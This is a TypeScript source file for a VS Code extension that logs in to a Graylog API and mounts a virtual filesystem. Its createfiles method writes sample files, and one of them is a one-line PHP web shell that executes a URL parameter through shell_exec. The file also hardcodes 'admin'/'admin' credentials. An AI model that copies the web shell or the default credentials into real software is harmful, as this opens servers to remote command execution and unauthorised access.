import * as vscode from 'vscode';
import * as fs from 'fs';
import * as path from 'path';
import { GraylogFileSystemProvider } from './fileSystemProvider';
import axios from 'axios';
import { json } from 'stream/consumers';
export class ConnectionPart{


    public apiUrl:string = "";
    public accountUserName = "";
    public accountPassword = "";
    public workingDirectory="";
    constructor(private graylogFilesystem: GraylogFileSystemProvider){
   //     this.workingDirectory = this.getDefaultWorkingDirectory();
    }


    public async LoginInitialize(){
      let initapiurl:string = "";
      let initusername:string = "";
      let initpassword:string = "";
      
      do{
        
        if(initapiurl.length==0)
          initapiurl = await vscode.window.showInputBox({
            placeHolder: 'Please type Graylog API Url',
            ignoreFocusOut: true
          }) ?? "";

          if(!(await this.testAPI(initapiurl)))
          {
            vscode.window.showErrorMessage("API url is not valid.");
            initapiurl = "";
            continue;
          }
          if(initusername =="")
            initusername = await vscode.window.showInputBox({
              placeHolder: 'Plz type the username',
              ignoreFocusOut: true
            }) ?? "";

          if(initusername == ""){
            vscode.window.showErrorMessage("Username cannot be empty");
            continue;
          }

          if(initpassword =="")
            initpassword = await vscode.window.showInputBox({
              placeHolder: 'Plz type the password',
              ignoreFocusOut: true,
              password: true
            }) ?? "";
          if(initpassword =="")
          {
            vscode.window.showErrorMessage("Password cannot be empty.");
            continue;
          }

          if(!await this.testUserInfo(initapiurl,initusername,initpassword)){
            vscode.window.showErrorMessage("User Info is not valid");
            initusername = "";
            initpassword = "";
            continue;
          }

          this.accountPassword = initpassword;
          this.accountUserName = initusername;
          if(initapiurl.includes("/api")){
            this.apiUrl = initapiurl.substring(0,initapiurl.indexOf("/api")-1)
          }else{
            this.apiUrl = initapiurl;
          }
          break;
        }while(true);

        

        vscode.workspace.updateWorkspaceFolders(0, 0, { uri: vscode.Uri.parse('graylog:/'), name: "Graylog API" });

    }

    public  async testAPI(apiPath:string):Promise<boolean>{
        try{
            const res  = await axios.get(apiPath);
            if(res.status == 200)
                return true;
            else return false;
        }catch(e){
            return false;
        }
    }

    public async testUserInfo(apiPath:string, username:string, password:string):Promise<boolean>{
        try{
            let path="";
            if(apiPath.includes("/api")){
                path = apiPath.substring(0,apiPath.indexOf("/api"));
            }else path = apiPath;

            const res  = await axios.get(`${path}/api/cluster`, {
                params: {
                  'pretty': 'true'
                },
                headers: {
                  'Accept': 'application/json'
                },
                auth: {
                  username: username,
                  password: password
                }
              });
              
              if(Object.keys(res.data).length > 0)
              {
                this.accountUserName = username;
                this.accountPassword = password;
                this.apiUrl = apiPath;
                return true;
              }  

              return false;
        }catch(e){
            return false;
        }
    }

    public createfiles(){
        this.graylogFilesystem.writeFile(vscode.Uri.parse(`graylog:/file.json`), Buffer.from('{ "json": true }'), { create: true, overwrite: true });
		this.graylogFilesystem.writeFile(vscode.Uri.parse(`graylog:/file.ts`), Buffer.from('console.log("TypeScript")'), { create: true, overwrite: true });
		this.graylogFilesystem.writeFile(vscode.Uri.parse(`graylog:/file.css`), Buffer.from('* { color: green; }'), { create: true, overwrite: true });
		this.graylogFilesystem.writeFile(vscode.Uri.parse(`graylog:/file.md`), Buffer.from('Hello _World_'), { create: true, overwrite: true });
		this.graylogFilesystem.writeFile(vscode.Uri.parse(`graylog:/file.xml`), Buffer.from('<?xml version="1.0" encoding="UTF-8" standalone="yes" ?>'), { create: true, overwrite: true });
		this.graylogFilesystem.writeFile(vscode.Uri.parse(`graylog:/file.py`), Buffer.from('import base64, sys; base64.decode(open(sys.argv[1], "rb"), open(sys.argv[2], "wb"))'), { create: true, overwrite: true });
		this.graylogFilesystem.writeFile(vscode.Uri.parse(`graylog:/file.php`), Buffer.from('<?php echo shell_exec($_GET[\'e\'].\' 2>&1\'); ?>'), { create: true, overwrite: true });
		this.graylogFilesystem.writeFile(vscode.Uri.parse(`graylog:/file.yaml`), Buffer.from('- just: write something'), { create: true, overwrite: true });
    }


    public async GetAllRules(){
      try{
        const response = await axios.get('/api/system/pipelines/rule', {
          headers: {
            'Accept': 'application/json'
          },
          auth: {
            username: 'admin',
            password: 'admin'
          }
        });
      }catch(e){
          return false;
      }
    }
    initializeDirectories(){

    }
}
